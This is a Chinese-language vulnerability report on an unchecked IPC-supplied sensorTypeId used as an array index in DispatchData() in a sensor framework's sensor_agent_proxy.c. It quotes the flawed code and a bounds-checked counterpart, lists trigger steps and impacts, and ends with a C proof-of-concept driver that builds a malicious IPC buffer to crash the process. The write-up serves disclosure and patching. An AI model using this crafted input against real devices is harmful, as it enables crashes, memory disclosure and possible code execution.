## 漏洞概述

`sensors_sensor_lite` 的 `DispatchData()` 函数将 `sensorEvent->sensorTypeId` 直接用作全局数组 `g_callbackNodes[]` 的索引，无任何边界检查。该 sensorTypeId 来源于 IPC 数据（`SensorChannelCallback` 从 IPC buffer 中 cast 得到的 `SensorEvent` 结构体），攻击者可构造任意 sensorTypeId 值触发越界读取。

同一文件中的 `InsertCallbackNode()` 和 `DeleteCallbackNode()` 均有 `sensorTypeId >= SENSOR_TYPE_ID_MAX` 的边界检查，但 `DispatchData()` 遗漏了此检查。

## 问题代码

**文件**: `frameworks/src/sensor_agent_proxy.c`

```c
// Line 38 — 全局数组定义
CallbackNode g_callbackNodes[(int32_t)SENSOR_TYPE_ID_MAX] = { ... };

// Line 193-206 — DispatchData 无边界检查
void DispatchData(SensorEvent *sensorEvent)
{
    if (sensorEvent == NULL) {
        return;
    }
    int32_t sensorId = sensorEvent->sensorTypeId;  // ← IPC 不可信数据
    CallbackNode *node = (CallbackNode *)(g_callbackNodes[sensorId].next);
    //                                    ^^^^^^^^^^^^^^^^^^^^^^^^
    //                                    无边界检查，sensorId 可为任意值
    while (node != NULL) {
        node->callback(sensorEvent);
        node = (CallbackNode *)(node->next);
    }
}

// Line 225-233 — SensorChannelCallback 数据来源
SensorEvent *event = (SensorEvent *)(eventData);  // ← IPC ReadBuffer 直接 cast
g_sensorEvent->sensorTypeId = event->sensorTypeId;  // ← 不可信
DispatchData(g_sensorEvent);  // ← 传入未校验的 sensorTypeId
```

对比已有边界检查的函数：
```c
// Line 60-65 — InsertCallbackNode 有检查
static int32_t InsertCallbackNode(int32_t sensorTypeId, const SensorUser *user)
{
    if ((sensorTypeId >= (int32_t)SENSOR_TYPE_ID_MAX) || (sensorTypeId < 0)) {
        return SENSOR_ERROR_INVALID_PARAM;  // ← 正确的边界检查
    }
    ...
}
```

## 触发条件

1. 攻击者控制 Sensor Service 的 IPC 数据通道
2. 构造 IPC 消息，其中 `SensorEvent.sensorTypeId` 设置为超出 `SENSOR_TYPE_ID_MAX` 的值
3. `SensorChannelCallback` 接收数据后调用 `DispatchData`
4. 越界访问 `g_callbackNodes[恶意值]`

## 影响

- 越界读取全局数组后的内存（信息泄露）
- 若越界位置的 `.next` 字段非 NULL，将跳转到攻击者可控地址执行 `node->callback()`（代码执行）
- 进程崩溃（SIGSEGV）

### test_driver.c

```c
/*
 * Target-Compile PoC: DispatchData OOB Array Index (CWE-129)
 *
 * Trigger path:
 *   SensorChannelCallback (IPC dispatch entry)
 *     → ReadUint32(len1) → ReadBuffer(len1) → cast to SensorEvent*
 *       → sensorTypeId=0x7FFFFFFF copied to g_sensorEvent
 *         → DispatchData(g_sensorEvent) → g_callbackNodes[0x7FFFFFFF].next
 *           → SEGV (out-of-bounds READ)
 *
 * Build: Links against real sensor_agent_proxy.o + ohos_stubs.o
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "sensor_agent_type.h"
#include "serializer.h"
#include "ipc_skeleton.h"

extern SensorEvent *g_sensorEvent;
extern int32_t SensorChannelCallback(uint32_t code, IpcIo *data, IpcIo *reply, MessageOption option);

int main(void)
{
    /* Initialize g_sensorEvent (must be non-NULL for code to proceed) */
    g_sensorEvent = (SensorEvent *)malloc(sizeof(SensorEvent));
    if (!g_sensorEvent) {
        fprintf(stderr, "malloc failed\n");
        return 1;
    }
    memset(g_sensorEvent, 0, sizeof(SensorEvent));

    /* Build IPC buffer with malicious sensorTypeId */
    uint8_t ipc_buffer[512];
    memset(ipc_buffer, 0, sizeof(ipc_buffer));
    size_t off = 0;

    /* Wire format: [uint32_t len1] [len1 bytes: SensorEvent] [uint32_t len2] [len2 bytes: sensor data] */
    uint32_t len1 = 64;
    memcpy(ipc_buffer + off, &len1, sizeof(uint32_t));
    off += sizeof(uint32_t);

    /* Write malicious SensorEvent with OOB sensorTypeId */
    int32_t malicious_sensor_id = 0x7FFFFFFF;  /* TRIGGER: way beyond g_callbackNodes[] bounds */
    memcpy(ipc_buffer + off, &malicious_sensor_id, sizeof(int32_t));
    off += len1;

    /* Write sensor data (non-zero length so sensorData != NULL) */
    uint32_t len2 = 8;
    memcpy(ipc_buffer + off, &len2, sizeof(uint32_t));
    off += sizeof(uint32_t);
    uint64_t dummy_data = 0xDEADBEEFCAFEBABEULL;
    memcpy(ipc_buffer + off, &dummy_data, sizeof(dummy_data));
    off += len2;

    /* Setup IpcIo for reading and RESET cursor */
    IpcIo data;
    IpcIoInit(&data, ipc_buffer, off, 0);
    data.bufferCur = data.bufferBase;
    data.bufferLeft = off;

    /* Call the vulnerable function */
    MessageOption option;
    memset(&option, 0, sizeof(option));
    fprintf(stderr, "[*] Calling SensorChannelCallback with sensorTypeId=0x7FFFFFFF\n");
    int32_t ret = SensorChannelCallback(0, &data, NULL, option);
    fprintf(stderr, "[*] SensorChannelCallback returned: %d\n", ret);

    free(g_sensorEvent);
    g_sensorEvent = NULL;
    return 0;
}
```
